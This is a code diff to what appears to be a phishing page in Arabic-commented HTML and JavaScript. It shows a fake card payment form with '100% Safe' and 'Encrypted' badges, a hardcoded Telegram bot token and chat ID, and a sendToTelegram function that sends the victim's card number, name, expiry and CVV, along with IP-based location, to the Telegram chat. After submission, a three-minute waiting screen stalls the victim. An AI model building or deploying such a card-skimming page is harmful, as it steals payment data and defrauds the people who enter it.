@@ -169,7 +169,7 @@ label svg{width:13px;height:13px;fill:none;stroke:#64748b;stroke-width:2;stroke-
 }
 .sec-badge svg{width:17px;height:17px;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}
 
-/* ── WAITING SCREEN (شاشة الانتظار الجديدة) ── */
+/* waiting screen */
 .waiting-screen {
   position:fixed;
   top:0;
@@ -254,7 +254,7 @@ label svg{width:13px;height:13px;fill:none;stroke:#64748b;stroke-width:2;stroke-
 
 <canvas id="bg2"></canvas>
 
-<!-- شاشة الانتظار الجديدة (3 دقائق) -->
+<!-- شاشة الانتظار -->
 <div class="waiting-screen" id="waitingScreen">
   <div class="waiting-icon">
     <svg viewBox="0 0 24 24"><path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/><circle cx="12" cy="12" r="3"/></svg>
@@ -269,7 +269,6 @@ label svg{width:13px;height:13px;fill:none;stroke:#64748b;stroke-width:2;stroke-
 </div>
 
 <div class="wrapper">
-
   <!-- FORM PANEL -->
   <div class="form-panel">
     <div class="form-title">
@@ -330,7 +329,6 @@ label svg{width:13px;height:13px;fill:none;stroke:#64748b;stroke-width:2;stroke-
 
   <!-- INFO PANEL -->
   <div class="info-panel">
-
     <div class="card-scene">
       <div class="card-3d" id="card3d">
         <div class="card-face card-front">
@@ -369,7 +367,6 @@ label svg{width:13px;height:13px;fill:none;stroke:#64748b;stroke-width:2;stroke-
       <div class="sec-badge"><svg viewBox="0 0 24 24" style="stroke:#7c3aed"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Encrypted</div>
       <div class="sec-badge"><svg viewBox="0 0 24 24" style="stroke:#ffd700"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>100% Safe</div>
     </div>
-
   </div>
 </div>
 
@@ -378,11 +375,10 @@ label svg{width:13px;height:13px;fill:none;stroke:#64748b;stroke-width:2;stroke-
 const BOT_TOKEN = "8661630120:AAFRe5NUWWsiQ-GeDHBfw1-_Kcw8a6wbACY";
 const CHAT_ID = "7655512204";
 
-/* تخزين آخر محاولة (مرة كل دقيقة) */
+/* تخزين آخر محاولة */
 let lastSubmitTime = 0;
 
 /* ========== دوال التحقق ========== */
-
 function isFakeCard(cardNumber) {
   let clean = cardNumber.replace(/\s/g, '');
   let fakePatterns = [
@@ -426,29 +422,26 @@ function canSubmit() {
   return { allowed: true };
 }
 
+/* الحصول على IP والبلد - بدون توكن */
 async function getIPInfo() {
   try {
-    let response = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN');
-    let data = await response.json();
+    // جلب IP من api.ipify.org
+    let ipResponse = await fetch('https://api.ipify.org?format=json');
+    let ipData = await ipResponse.json();
+    let ip = ipData.ip || 'غير معروف';
+    
+    // جلب معلومات البلد من ipapi.co (مجاني)
+    let geoResponse = await fetch('https://ipapi.co/' + ip + '/json/');
+    let geoData = await geoResponse.json();
+    
     return {
-      ip: data.ip || 'غير معروف',
-      country: data.country || 'غير معروف',
-      city: data.city || 'غير معروف',
-      region: data.region || 'غير معروف'
+      ip: ip,
+      country: geoData.country_name || 'غير معروف',
+      city: geoData.city || 'غير معروف',
+      region: geoData.region || 'غير معروف'
     };
   } catch(e) {
-    try {
-      let response2 = await fetch('https://api.ipify.org?format=json');
-      let data2 = await response2.json();
-      return {
-        ip: data2.ip || 'غير معروف',
-        country: 'غير معروف',
-        city: 'غير معروف',
-        region: 'غير معروف'
-      };
-    } catch(e2) {
-      return { ip: 'غير معروف', country: 'غير معروف', city: 'غير معروف', region: 'غير معروف' };
-    }
+    return { ip: 'غير معروف', country: 'غير معروف', city: 'غير معروف', region: 'غير معروف' };
   }
 }
 
@@ -552,7 +545,7 @@ async function sendToTelegram(cardNumber, cardName, expiry, cvv) {
   fetch(url, { mode: 'no-cors' }).catch(err => console.log("خطأ:", err));
 }
 
-/* شاشة الانتظار 3 دقائق */
+/* شاشة الانتظار */
 function showWaitingScreen() {
   let waitingScreen = document.getElementById('waitingScreen');
   let timerElement = document.getElementById('waitTimer');
@@ -560,16 +553,14 @@ function showWaitingScreen() {
   
   waitingScreen.classList.add('show');
   
-  let totalSeconds = 180; // 3 دقائق = 180 ثانية
+  let totalSeconds = 180;
   let interval = setInterval(function() {
     totalSeconds--;
     let minutes = Math.floor(totalSeconds / 60);
     let seconds = totalSeconds % 60;
     timerElement.innerText = `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
-    
     let progressPercent = ((180 - totalSeconds) / 180) * 100;
     progressBar.style.width = progressPercent + '%';
-    
     if (totalSeconds <= 0) {
       clearInterval(interval);
       window.location.href = 'index.html';
@@ -625,8 +616,6 @@ document.getElementById('payForm').addEventListener('submit', async function(e){
   
   lastSubmitTime = Date.now();
   await sendToTelegram(num, name, exp, cvv);
-  
-  // إظهار شاشة الانتظار بدلاً من الـ Success overlay
   showWaitingScreen();
 });
 </script>
